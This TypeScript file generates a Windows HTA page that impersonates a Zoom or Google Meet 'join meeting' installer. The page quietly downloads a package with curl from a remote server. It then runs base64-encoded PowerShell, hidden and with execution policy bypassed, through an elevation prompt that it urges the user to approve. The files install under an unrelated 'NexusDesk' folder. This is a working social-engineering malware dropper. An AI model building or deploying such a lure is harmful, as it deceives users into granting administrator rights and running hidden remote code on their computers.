type InviteTemplate = 'zoom' | 'google_meet';

function normalizeTemplate(template?: string | null): InviteTemplate {
  return template === 'google_meet' ? 'google_meet' : 'zoom';
}

interface HtaBrand {
  windowTitle: string;
  applicationName: string;
  heading: string;
  subheading: string;
  downloadLabel: string;
  installLabel: string;
  accent: string;
  accentDark: string;
  pageBg: string;
  finishMessage: string;
  headerHtml: string;
  bodyClass: string;
  btnRadius: string;
  shellWidth: number;
  shellHeight: number;
}

const MEET_SVG =
  '<svg class="meet-svg" width="28" height="28" viewBox="0 0 48 48" aria-hidden="true">' +
  '<path fill="#00832d" d="M44 14L30 24l14 10V14z"/>' +
  '<path fill="#0066da" d="M30 24L4 6v36l26-18z"/>' +
  '<path fill="#e94235" d="M4 6l14 10-14 10V6z"/>' +
  '<path fill="#2684fc" d="M30 24l14-10v20L30 24z"/>' +
  '<path fill="#00ac47" d="M4 42l26-18 14 10L4 42z"/>' +
  '<path fill="#ffba00" d="M18 16l12 8-12 8V16z"/>' +
  '</svg>';

function htaBrand(template?: string | null): HtaBrand {
  if (normalizeTemplate(template) === 'google_meet') {
    return {
      windowTitle: 'Google Meet',
      applicationName: 'Google Meet',
      heading: 'Ready to join?',
      subheading: 'Download and run the meeting app to connect from your computer.',
      downloadLabel: 'Downloading meeting app',
      installLabel: 'Setting up',
      accent: '#1a73e8',
      accentDark: '#1557b0',
      pageBg: '#ffffff',
      finishMessage: 'You are ready to join. Return to your browser to continue.',
      bodyClass: 'meet',
      btnRadius: '24px',
      shellWidth: 500,
      shellHeight: 360,
      headerHtml:
        '<div class="brand-row">' +
        MEET_SVG +
        '<span class="meet-title">Google Meet</span></div>',
    };
  }
  return {
    windowTitle: 'Zoom',
    applicationName: 'Zoom',
    heading: 'Join Meeting',
    subheading: 'Download and run the Zoom client to connect from your computer.',
    downloadLabel: 'Downloading Zoom Client',
    installLabel: 'Setting up Zoom',
    accent: '#0b5cff',
    accentDark: '#0947cc',
    pageBg: '#ffffff',
    finishMessage: 'You are ready to join. Return to your browser to continue.',
    bodyClass: 'zoom',
    btnRadius: '8px',
    shellWidth: 500,
    shellHeight: 360,
    headerHtml: '<div class="zoom-wordmark">zoom</div>',
  };
}

/**
 * Guest-facing Windows HTA installer.
 * Keeps the UI window open (no self-relaunch). Downloads without admin,
 * then elevates only the setup script via ShellExecute runas.
 */
export function buildGuestInstallerHta(
  code: string,
  apiUrl: string,
  encodedPsChunks: string[],
  template?: string | null,
): string {
  const base = apiUrl.replace(/\/$/, '').replace(/\\/g, '\\\\').replace(/"/g, '');
  const safeCode = code.replace(/[^A-Za-z0-9]/g, '');
  const brand = htaBrand(template);
  const chunkJs = encodedPsChunks.map((c) => JSON.stringify(c)).join(',\n');

  return `<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta charset="utf-8">
<title>${brand.windowTitle}</title>
<HTA:APPLICATION
  ID="MeetingSetup"
  APPLICATIONNAME="${brand.applicationName}"
  BORDER="dialog"
  BORDERSTYLE="normal"
  CAPTION="yes"
  SHOWINTASKBAR="yes"
  SINGLEINSTANCE="no"
  SYSMENU="yes"
  WINDOWSTATE="normal"
  SCROLL="no"
  MAXIMIZEBUTTON="no"
  MINIMIZEBUTTON="no"
/>
<style>
  * { box-sizing: border-box; }
  html, body { margin: 0; padding: 0; overflow: hidden; height: 100%; }
  body {
    font-family: "Segoe UI", "Google Sans", Roboto, Arial, sans-serif;
    background: ${brand.pageBg};
    color: #202124;
  }
  .shell { padding: 26px 30px 22px; }
  .zoom-wordmark {
    font-size: 28px; font-weight: 700; color: #0b5cff;
    letter-spacing: -0.04em; text-transform: lowercase;
  }
  .brand-row { display: flex; align-items: center; gap: 10px; }
  .meet-title { font-size: 22px; font-weight: 500; color: #5f6368; }
  body.meet .meet-title { color: #202124; font-weight: 400; }
  .meet-svg { display: block; flex-shrink: 0; }
  h1 { margin: 18px 0 8px; font-size: 24px; font-weight: 400; color: #202124; line-height: 1.2; }
  body.zoom h1 { font-weight: 600; font-size: 22px; }
  .sub { margin: 0 0 20px; font-size: 13px; color: #5f6368; line-height: 1.5; max-width: 420px; }
  .panel {
    background: #f8f9fa; border: 1px solid #e8eaed;
    border-radius: 12px; padding: 14px 16px;
  }
  .status-row { display: flex; align-items: center; gap: 8px; min-height: 20px; margin-bottom: 10px; }
  .spinner {
    width: 14px; height: 14px; border: 2px solid #e8eaed;
    border-top-color: ${brand.accent}; border-radius: 50%;
    display: none;
  }
  .spinner.on { display: inline-block; animation: spin 0.75s linear infinite; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .status { font-size: 13px; color: #3c4043; flex: 1; }
  .status.ok { color: ${brand.accent}; font-weight: 600; }
  .status.err { color: #d93025; font-weight: 600; }
  .progress-row { display: flex; align-items: center; gap: 12px; }
  .bar {
    flex: 1; height: 6px; background: #e8eaed;
    border-radius: 999px; overflow: hidden;
  }
  .fill {
    height: 100%; width: 0%; background: ${brand.accent};
    border-radius: 999px;
  }
  .pct { font-size: 12px; color: #5f6368; min-width: 40px; text-align: right; font-variant-numeric: tabular-nums; }
  .btn {
    margin-top: 20px; min-width: 128px; padding: 10px 24px;
    background: ${brand.accent}; color: #fff; border: 0;
    border-radius: ${brand.btnRadius}; font-size: 14px; font-weight: 500;
    cursor: pointer;
  }
  .btn:hover:not([disabled]) { background: ${brand.accentDark}; }
  .btn[disabled] { opacity: 0.55; cursor: default; }
  .footer { margin-top: 12px; font-size: 11px; color: #9aa0a6; }
</style>
<script language="JScript">
var API_URL = "${base}";
var GUEST_CODE = "${safeCode}";
var CHUNKS = [${chunkJs}];
var DOWNLOAD_LABEL = "${brand.downloadLabel}";
var INSTALL_LABEL = "${brand.installLabel}";
var FINISH_MSG = "${brand.finishMessage}";
var SHELL_W = ${brand.shellWidth};
var SHELL_H = ${brand.shellHeight};

function pumpUI() {
  try { document.body.style.cursor = "wait"; document.body.style.cursor = "default"; } catch (e) {}
}
function setSpinner(on) {
  var el = document.getElementById("spinner");
  if (el) el.className = "spinner" + (on ? " on" : "");
}
function setStatus(text, cls) {
  var el = document.getElementById("status");
  el.className = "status " + (cls || "");
  el.innerText = text;
  pumpUI();
}
function setPctLabel(text) {
  var el = document.getElementById("pct");
  if (el) el.innerText = text;
}
function setProgress(pct) {
  var fill = document.getElementById("fill");
  var clamped = Math.max(0, Math.min(100, pct));
  fill.style.width = clamped + "%";
  setPctLabel(Math.round(clamped) + "%");
  pumpUI();
}
function showError(msg) {
  setSpinner(false);
  setProgress(100);
  setStatus(String(msg || "Setup failed."), "err");
  var btn = document.getElementById("startBtn");
  btn.disabled = false;
  btn.innerText = "Try again";
  btn.onclick = startInstall;
}
function fso() { return new ActiveXObject("Scripting.FileSystemObject"); }
function sh() { return new ActiveXObject("WScript.Shell"); }
function ensureDir(p) {
  var f = fso();
  if (!f.FolderExists(p)) f.CreateFolder(p);
}
function writeText(path, text) {
  var ts = fso().CreateTextFile(path, true, false);
  ts.Write(text);
  ts.Close();
}
function appendText(path, text) {
  var ts = fso().OpenTextFile(path, 8, true);
  ts.Write(text);
  ts.Close();
}
function fileSize(path) {
  try {
    if (!fso().FileExists(path)) return 0;
    return fso().GetFile(path).Size;
  } catch (e) { return 0; }
}
function workRoot() {
  var local = sh().ExpandEnvironmentStrings("%LOCALAPPDATA%");
  var root = local + "\\\\NexusDesk\\\\Agent";
  ensureDir(local + "\\\\NexusDesk");
  ensureDir(root);
  return root;
}
function publicStatusDir() {
  var pub = sh().ExpandEnvironmentStrings("%PUBLIC%");
  var dir = pub + "\\\\NexusDesk";
  ensureDir(dir);
  return dir;
}
function completePath() { return publicStatusDir() + "\\\\setup-complete-" + GUEST_CODE + ".txt"; }
function failedPath() { return publicStatusDir() + "\\\\setup-failed-" + GUEST_CODE + ".txt"; }
function progressPath() { return publicStatusDir() + "\\\\setup-progress-" + GUEST_CODE + ".txt"; }
function readProgressStatus() {
  try {
    var p = progressPath();
    if (!fso().FileExists(p)) return null;
    var ts = fso().OpenTextFile(p, 1);
    var raw = ts.ReadAll();
    ts.Close();
    var parts = String(raw).split("|");
    if (parts.length < 1) return null;
    var pct = parseInt(parts[0], 10);
    if (isNaN(pct)) return null;
    return { pct: pct, msg: parts.length > 1 ? parts[1] : "" };
  } catch (e) { return null; }
}
function isCurlDownloading() {
  try {
    var locator = new ActiveXObject("WbemScripting.SWbemLocator");
    var svc = locator.ConnectServer(".", "root\\\\cimv2");
    var items = svc.ExecQuery("SELECT CommandLine FROM Win32_Process WHERE Name='curl.exe'");
    var e = new Enumerator(items);
    for (; !e.atEnd(); e.moveNext()) {
      var cl = String(e.item().CommandLine || "").toLowerCase();
      if (cl.indexOf("agent-package.zip") >= 0 || cl.indexOf(GUEST_CODE.toLowerCase()) >= 0) return true;
    }
    return false;
  } catch (ex) { return false; }
}
function headContentLength(url) {
  var xhr = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");
  xhr.open("HEAD", url, false);
  xhr.setRequestHeader("Cache-Control", "no-cache");
  xhr.send();
  if (xhr.status < 200 || xhr.status >= 300) {
    throw new Error("Cannot reach download server (" + xhr.status + ").");
  }
  var len = parseInt(xhr.getResponseHeader("Content-Length"), 10);
  return isNaN(len) ? 0 : len;
}
function downloadPackage(dest, done) {
  var url = API_URL + "/guest/" + GUEST_CODE + "/agent-package.zip";
  var total = 0;
  try { total = headContentLength(url); } catch (e1) { total = 0; }
  if (fso().FileExists(dest)) { try { fso().DeleteFile(dest, true); } catch (e2) {} }

  var curl = sh().ExpandEnvironmentStrings("%SystemRoot%") + "\\\\System32\\\\curl.exe";
  if (!fso().FileExists(curl)) {
    done(new Error("curl.exe not found. Windows 10 or later is required."));
    return;
  }
  var cmd = '"' + curl + '" -fL --connect-timeout 30 --max-time 1200 -o "' + dest + '" "' + url + '"';
  sh().Run(cmd, 0, false);

  setSpinner(true);
  setStatus(DOWNLOAD_LABEL + "...");
  setProgress(0);

  var lastSize = -1;
  var stable = 0;
  var ticks = 0;
  var timer = window.setInterval(function() {
    ticks++;
    var size = fileSize(dest);
    var curlActive = isCurlDownloading();
    var pct = 0;

    if (total > 0 && size > 0) {
      pct = Math.floor((size / total) * 100);
      if (pct > 100) pct = 100;
      setProgress(pct);
      setStatus(DOWNLOAD_LABEL + "... " + pct + "%");
    } else if (size > 0) {
      var guess = Math.min(92, Math.floor(size / 500000));
      setProgress(guess);
      setStatus(DOWNLOAD_LABEL + "...");
    }

    if (size > 0 && size === lastSize) stable++; else stable = 0;
    lastSize = size;

    var sizeMatches = total > 0 ? (size >= total - 8192) : (size > 500000);
    var downloadDone = false;
    if (!curlActive && size > 500000 && stable >= 2) downloadDone = true;
    if (!curlActive && sizeMatches && stable >= 1) downloadDone = true;
    if (!curlActive && total > 0 && pct >= 98 && stable >= 2) downloadDone = true;

    if (downloadDone) {
      window.clearInterval(timer);
      setProgress(100);
      setStatus(DOWNLOAD_LABEL + " 100%");
      setSpinner(false);
      window.setTimeout(function() { done(null); }, 400);
      return;
    }

    if (ticks > 720) {
      window.clearInterval(timer);
      setSpinner(false);
      done(new Error("Download timed out. Check your connection and try again."));
    }
  }, 250);
}
function runInstallPhase(packageZip, workDir, done) {
  setSpinner(true);
  setProgress(5);
  setStatus("Approve the Windows permission prompt...");

  var setupB64 = workDir + "\\\\setup.b64";
  var runCmd = workDir + "\\\\run-setup.cmd";
  var cPath = completePath();
  var fPath = failedPath();
  var pPath = progressPath();

  try {
    if (fso().FileExists(cPath)) fso().DeleteFile(cPath, true);
    if (fso().FileExists(fPath)) fso().DeleteFile(fPath, true);
    if (fso().FileExists(pPath)) fso().DeleteFile(pPath, true);
    if (fso().FileExists(setupB64)) fso().DeleteFile(setupB64, true);

    writeText(setupB64, CHUNKS[0]);
    for (var i = 1; i < CHUNKS.length; i++) appendText(setupB64, CHUNKS[i]);

    var psInner =
      "$s=Get-Content -LiteralPath '" + setupB64.replace(/'/g, "''") + "' -Raw; " +
      "$sb=[ScriptBlock]::Create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($s))); & $sb";

    writeText(
      runCmd,
      "@echo off\\r\\n" +
      "set \\"ND_PACKAGE_ZIP=" + packageZip + "\\"\\r\\n" +
      "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \\"" +
      psInner.replace(/"/g, '\\"') + "\\"\\r\\n"
    );

    var shellApp = new ActiveXObject("Shell.Application");
    // Request UAC, then keep the setup console hidden. The HTA remains the
    // only visible progress window.
    shellApp.ShellExecute("cmd.exe", '/c "' + runCmd + '"', "", "runas", 0);

    var fallbackPct = 8;
    var ticks = 0;
    var timer = window.setInterval(function() {
      ticks++;
      if (fso().FileExists(fPath)) {
        window.clearInterval(timer);
        setSpinner(false);
        var errText = "Setup failed.";
        try {
          var ts = fso().OpenTextFile(fPath, 1);
          errText = ts.ReadAll();
          ts.Close();
        } catch (e1) {}
        done(new Error(errText || "Setup failed."));
        return;
      }
      if (fso().FileExists(cPath)) {
        window.clearInterval(timer);
        try { fso().DeleteFile(setupB64, true); } catch (e2) {}
        setProgress(100);
        setStatus(INSTALL_LABEL + " 100%");
        setSpinner(false);
        window.setTimeout(function() { done(null); }, 350);
        return;
      }

      var prog = readProgressStatus();
      if (prog) {
        var shown = Math.max(5, Math.min(100, prog.pct));
        // While extracting, slowly nudge the bar so it does not look frozen.
        if (String(prog.msg).toLowerCase().indexOf("extract") >= 0 && shown < 57) {
          var nudge = Math.min(57, shown + Math.floor(ticks / 6));
          if (nudge > shown) shown = nudge;
        }
        setProgress(shown);
        if (prog.msg) {
          setStatus(INSTALL_LABEL + "... " + prog.msg + " " + shown + "%");
        } else {
          setStatus(INSTALL_LABEL + "... " + shown + "%");
        }
      } else {
        if (ticks === 2) {
          setStatus(INSTALL_LABEL + "... choose Yes if Windows asks");
        }
        if (ticks > 4 && fallbackPct < 40) {
          fallbackPct += 1;
          setProgress(fallbackPct);
          setStatus(INSTALL_LABEL + "... " + fallbackPct + "%");
        }
      }

      // ~3 minutes with no result
      if (ticks > 360) {
        window.clearInterval(timer);
        setSpinner(false);
        done(new Error("Setup did not finish. Click Try again and choose Yes on the Windows prompt."));
      }
    }, 500);
  } catch (err) {
    setSpinner(false);
    done(err);
  }
}
function startInstall() {
  document.getElementById("startBtn").disabled = true;
  document.getElementById("startBtn").innerText = "Please wait";
  setStatus("Preparing...");
  setProgress(0);
  window.setTimeout(doInstall, 150);
}
function doInstall() {
  try {
    var root = workRoot();
    var packageZip = root + "\\\\package-" + GUEST_CODE + ".zip";

    downloadPackage(packageZip, function(dlErr) {
      if (dlErr) { showError(dlErr.message || dlErr); return; }
      runInstallPhase(packageZip, root, function(instErr) {
        if (instErr) { showError(instErr.message || instErr); return; }
        setProgress(100);
        setStatus(FINISH_MSG, "ok");
        setSpinner(false);
        var btn = document.getElementById("startBtn");
        btn.innerText = "Done";
        btn.disabled = false;
        btn.onclick = function() { window.close(); };
      });
    });
  } catch (err) {
    showError(err.message || err);
  }
}
function onLoad() {
  window.resizeTo(SHELL_W, SHELL_H);
  window.moveTo((screen.width - SHELL_W) / 2, (screen.height - SHELL_H) / 2);
  setStatus("Click Continue to download and set up.");
  setProgress(0);
  var btn = document.getElementById("startBtn");
  btn.innerText = "Continue";
  btn.disabled = false;
  btn.onclick = startInstall;
}
</script>
</head>
<body class="${brand.bodyClass}" onload="onLoad()">
  <div class="shell">
    ${brand.headerHtml}
    <h1>${brand.heading}</h1>
    <p class="sub">${brand.subheading}</p>
    <div class="panel">
      <div class="status-row">
        <span id="spinner" class="spinner"></span>
        <div id="status" class="status">Starting...</div>
      </div>
      <div class="progress-row">
        <div class="bar"><div id="fill" class="fill"></div></div>
        <div id="pct" class="pct">0%</div>
      </div>
    </div>
    <button class="btn" id="startBtn" disabled>Please wait</button>
    <div class="footer">Please keep this window open until setup completes.</div>
  </div>
</body>
</html>`;
}
